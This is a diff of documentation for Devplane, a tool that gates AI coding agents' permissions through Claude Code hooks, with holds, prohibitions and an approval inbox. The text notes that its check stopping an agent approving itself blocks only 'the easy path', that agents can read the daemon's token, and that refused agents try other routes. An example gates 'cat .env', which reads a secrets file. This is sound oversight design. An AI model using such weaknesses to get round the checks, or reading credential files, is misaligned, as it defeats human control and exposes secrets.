+Neither answers *allow*, and prohibitions hold in every mode. `devplane modes` shows which sessions
+run without prompts. Evaluation is in-process and linear-time; `devplane doctor` probes the installed
+gate and prints the round trip.
 
 ## Answering a watched session's permission
 
-A permission on a session **you** started has no protocol request behind it, so nothing outside the
-agent can answer it. Without a hold the only thing Devplane can offer is *raise its window* — which
-is the inbox telling you to go and find the editor, once per permission, across every project in
-flight. On a phone it is not even that.
+A permission in a session **you** started can be answered away from its terminal if the project sets
+a hold:
 
 ```toml
 [questions]
 hold = true        # or "45s"
 ```
 
-With a hold, a permission your own `always_ask` rules matched waits that long for an answer from the
-inbox, the board or your phone. Answering it there returns your selection to the agent and records
-**you** as the authority.
+A call your `always_ask` rules matched is written as an ask, and the hook waits for the hold. Answer
+from the workbench's Inbox or with `devplane answer <ask> --allow` (or `--deny`); the first answer
+wins and **you** are the authority. If nobody answers, the ask ends with **nobody** as the authority
+and your agent shows its own dialog. A prohibition is applied first and never held.
 
-**Nobody answers and nothing changes.** The hook lapses, Claude Code shows its own dialog, and no
-decision is recorded — exactly the behaviour with no hold set. That is the whole safety argument: a
-`command` hook that reaches its timeout is cancelled and its output discarded, so it renders no
-decision, and `PermissionRequest` is not one of the two hooks documented as exceptions.
+**An agent cannot answer its own permission.** `devplane answer --allow` is refused inside an agent
+session (`CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `DEVPLANE_RUN`, or a Codex or Copilot session
+variable set); `--deny` still works. This stops the easy path, not a hostile process; see
+[Security](@/docs/security.md).
 
-**Only what `always_ask` matched is held**, so an unattended agent does not freeze on routine work.
-**A prohibition is applied first and is never held**, so a hold cannot turn a refusal into a question.
-**It does not fire in auto mode**, where a classifier approves silently and no prompt was going to be
-shown — your `never_auto` prohibitions still apply there, through `PreToolUse`.
+## Tuning the rules
 
-A held permission raises a desktop notification whatever its level: a wait measured in seconds is only
-reachable by somebody who has been told about it.
-
-**Devplane still never approves.** What travels here is a person's recorded selection, in transit —
-not a verdict. The policy engine never sees it, there is no `Verdict::Allow` for it to have returned,
-and an allow is unconstructible without a human answer having been written down first.
-
-## Auto mode
-
-Claude Code's **auto mode** reviews actions with a classifier instead of asking you, so routine calls
-run without a prompt. A `PermissionRequest` hook fires only when Claude Code is about to *ask* —
-which in auto mode is never. So Devplane installs two synchronous hooks:
-
-| Hook | Fires | Carries |
-|---|---|---|
-| `PreToolUse` | before every tool call, in every mode | a prohibition, or nothing |
-| `PermissionRequest` | only when a human was going to be asked | the same, plus the request to show you |
-
-Neither ever answers `allow`. **The effect:** `never_auto` and `always_ask` hold in every mode,
-including the one where no prompt would have appeared at all.
-
-## Speed, and why it matters
-
-Both hooks are **synchronous**: Claude Code is blocked on the answer. So evaluation is total,
-in-process, and cannot wait on anything — there is no "policy service unreachable" path to fail open
-through. `PreToolUse` fires on every tool call, so the cost matters:
-
-- A check costs **under 200&nbsp;µs**, path rules included, asserted by a test over 10 000 lookups.
-- A full round trip over loopback, worst of 50 consecutive requests, is **under 50&nbsp;ms**.
-- The matcher is **linear, not backtracking**. The pattern is yours but the text is a command an
-  agent chose, and a matcher that can be made exponential by its subject is a denial of service
-  against the hook a session is waiting on.
-
-The policy is cached per repository and invalidated by the file's modification time, re-checked at
-most once a second.
-
-## When the file is broken
-
-A malformed `devplane.toml` **keeps the rules it had**. A typo in a deny rule must never read as
-"no rules".
-
-That is only half an answer, because a process starting fresh against a broken file has no previous
-rules to keep — so `devplane doctor` names the project and says its rules are not in force, rather
-than leaving it to a log line. `devplane explain` says it too, and it is the one that matters while
-you are editing:
-
-```console
-$ devplane explain 'cat .env'
-undecided  Bash
-        this project's rules are NOT in force — the file below will not load
-
-devplane.toml is not valid: TOML parse error at line 3, column 2
-  |
-3 | [polcy]
-  |  ^^^^^
-unknown field `polcy`, expected one of `project`, `workspace`, `gates`, `policy`, …
-
-every rule in this file is off until it parses — devplane check
-```
-
-Three situations end in `undecided` and only one of them is a fact about the call — no rules here,
-rules that will not load, rules that loaded and did not match. `explain` says which.
-
-## Driven runs speak the same vocabulary
-
-The protocol's permission request carries the **tool kind** the agent declared and the **arguments it
-chose**, and those are what the rules are matched against:
-
-| Protocol kind | Evaluated as |
-|---|---|
-| `execute` | `Bash` |
-| `read`, `search` | `Read` |
-| `edit`, `delete`, `move` | `Edit` |
-| `fetch` | `WebFetch` |
-
-A call that maps to none of them — and carries no recognisable arguments — is **not evaluated at
-all**, and a person is asked.
-
-## Which rule to write next
-
-A permission in the inbox carries the rule that would stop it being asked again — the narrowest one
-covering the calls this machine has actually seen, with the count behind it and the file to paste it
-into. That file is **your agent's `settings.json`**, because that is where a grant is enforced:
-
-```console
-$ devplane inbox
-…
-     never asked again: "permissions": { "allow": ["Bash(cargo test *)"] }
-     covers 6 calls like it · paste into /Users/me/work/saas/.claude/settings.json permissions.allow
-```
-
-A pattern is offered only past three distinct calls; below that it is the exact call, because one
-interruption says nothing about the shape of the ones like it. The rule is replayed against the call
-before you are shown it, so one that would not have decided it is refused rather than handed over.
-
-**Nothing writes it for you.** An agent here runs as you and can read the daemon's token, so a route
-that edited anyone's permissions would be reachable by the thing they govern.
-
-## How you find out a rule is too tight
-
-**A refused agent does not stop — it tries something else.** So a rule that is exactly right and one
-that is far too broad look the same on the board: a session still working, a cost column still
-climbing, nothing in the inbox.
-
-Refusals are counted. Five in one live run raises a `refused` item naming the rule that stopped it:
-
-```console
-$ devplane inbox
-refused   core-lib   7 calls refused in this run
-          The last one was `Bash`, refused by `Bash(git *)`. Check that the rule means
-          what you meant.
-```
-
-It never interrupts — `normal` level — and `devplane attention` reports what became of every one, so
-a threshold that is wrong shows up in the `dismissed` column.
-
-## Every verdict is recorded
-
-With the rule named. See [the decision log](/docs/decisions/).
+- **Asked too often:** a permission in `devplane inbox` carries the narrowest rule that would stop it
+  being asked, and the `settings.json` to paste it into. `devplane rules <rule>` checks every
+  registered project.
+- **A rule too tight:** five refusals in one run raise a `refused` item naming the rule.
